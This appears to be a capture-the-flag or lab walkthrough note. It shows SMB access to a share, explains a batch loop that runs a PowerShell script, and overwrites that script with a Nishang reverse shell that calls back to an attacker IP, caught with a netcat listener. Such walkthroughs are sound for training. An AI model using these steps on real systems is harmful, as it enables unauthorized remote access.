- Connect with `smbclient` with the credentials you got.

```
smbclient //<MACHINE IP>/Enterprise-Share -U 'enterprise-security'
smb: \> dir
```

![[Screenshot_2025-10-04_13-45-23.png]]
## Windows batch loop that repeatedly runs a PowerShell script

- Note: the shell starts at `C:\Users\enterprise-security\Downloads` where there is `startup.bat`.
- If you look at the `startup.bat` content you'll see:

![[Screenshot_2025-10-06_04-57-27.png]]

- `:home` → label for the loop start.
- `TIMEOUT /T 30 /NOBREAK` → pause up to 30 seconds; user keypress won’t skip it.
- `powershell.exe -File ...` → runs the PowerShell script (synchronously).
- `TIMEOUT /T 30` → pause 30 seconds (this one _can_ be interrupted by a keypress).
- `cls` → clear the console.
- `Goto :home` → jump back to `:home` — infinite loop.

So it does: wait 30s → run PS script → wait 30s → clear screen → repeat forever. Net interval ≈ time-of-run + ~60s.

---

### Issues / cautions

- **Infinite loop** — runs forever until manually stopped or the machine reboots. That may be fine for some monitoring tasks but often undesirable.
- **No error handling** — you don’t capture whether the PowerShell script succeeded or failed.
- **No logging** — no record of runs, errors, or timestamps.

- **Running from share / path** — ensure `C:\Enterprise-Share\…` is accessible and trusted. If it’s a network share, consider network credentials and startup timing.
- Using `powershell.exe` vs `pwsh` — on PowerShell Core/7 use `pwsh` if needed.
- **Keyboard-break behavior inconsistent** — first `TIMEOUT` uses `/NOBREAK`, second doesn’t.
- **Not robust at startup** — if you want this to run as a recurring task, Windows Task Scheduler is usually a better option than a background console loop.

## PurgeIrrelevantData_1826.ps1

This is the file to be executed on the infinite loop.

- Display the `PurgeIrrelevantData_1826.ps1` content .

```
smb: \> more PurgeIrrelevantData_1826.ps1
```

![[Screenshot_2025-10-04_13-50-51 1.png]]

Effect: it will **silently delete everything inside** `C:\Users\Public\Documents\` but **not the folder itself**.

## Reverse Shell

#Attacking_Machine 
- You need a reverse shell like `Invoke-PowerShellTcp.ps1` to get a shell on your attacking machine. You can download it from [here](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1).
- After download it, rename it as `PurgeIrrelevantData_1826.ps1`.
- Add the following line at the bottom of the file.

```
Invoke-PowerShellTcp -Reverse -IPAddress <ATTACKING MACHIINE IP> -Port 443
```

#SMB_shell
- Put it to the victim machine.

```
smb: \> put PurgeIrrelevantData_1826.ps1 
```

#Attacking_Machine 
- Open a netcat listener on port 443.

```
nc -lnvp 443
```

As the `PurgeIrrelevantData_1826.ps1` supposedly is running as a cron task, you'll have to wait for the target system to execute the script.

![[Screenshot_2025-10-04_14-36-22.png]]

You got  shell.

**Next step:** [[User's flag]]




